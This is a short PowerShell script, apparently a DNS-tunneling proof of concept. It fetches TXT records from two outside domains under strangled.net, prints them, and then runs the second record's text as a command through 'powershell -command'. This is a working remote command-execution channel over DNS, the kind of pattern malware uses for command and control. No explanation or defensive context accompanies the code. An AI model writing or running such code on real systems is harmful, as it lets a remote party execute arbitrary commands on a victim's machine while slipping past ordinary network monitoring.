function MyDnstunneling{
    $P1 = Resolve-DnsName "ilam.strangled.net."  -Type TXT
    Write-Host "text from ilam.strangled.net"
    Write-Host "---------------------------------------------------------"
    Write-Host $P1.Name,   $P1.Type,   $P1.TTL,   $P1.Section,   $P1.Strings
    $P2 = Resolve-DnsName "ilam1.strangled.net." -Type TXT
    Write-Host
    Write-Host "text from ilam1.strangled.net"
    Write-Host "---------------------------------------------------------"
    Write-Host $P2.Name,   $P2.Type,   $P2.TTL,   $P2.Section,   $P2.Strings
    Write-Host "Run Commande"
    powershell -command $P2.Strings
}

